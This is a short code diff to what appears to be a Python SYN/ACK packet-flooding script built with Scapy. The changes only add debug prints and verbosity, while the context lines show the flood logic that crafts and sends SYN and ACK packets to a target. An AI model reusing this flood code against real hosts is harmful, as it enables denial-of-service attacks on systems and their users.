@@ -17,7 +17,7 @@ def error(message):
 
 def send_syn(pkt, synackpacketlist):
         try:
-            synack=sr1(pkt, verbose = 0)
+            synack=sr1(pkt, verbose = 1)
             synackpacketlist.append(synack)
         except:
                 error('Invalid FQDN address')
@@ -76,7 +76,7 @@ def flood(dst, packets, alist):
         for i in range(0, packets+1):
                 s = makesyn(addrs[i], dst)
                 synpacketlist.append(s)
-
+        print(synpacketlist)
         proctime = time.process_time()-proctime
         print(f'Done in {proctime} sec')       
 
@@ -85,6 +85,7 @@ def flood(dst, packets, alist):
                 s = threading.Thread(target= send_syn(synpacketlist[i], synackpacketlist))
                 s.start()
         proctime = time.process_time()-proctime
+        print(synackpacketlist)
         print(f'Done in {proctime} sec') 
 
         print('crafting ack packets...')
@@ -93,7 +94,7 @@ def flood(dst, packets, alist):
                 ackpacketlist.append(ack)
         proctime = time.process_time()-proctime
         print(f'Done in {proctime} sec')       
-
+        print(ackpacketlist)
         print('sending ack packets...')
         for i in range(0, packets+1):
                 s = threading.Thread(target= send(synpacketlist[i], verbose = 0))
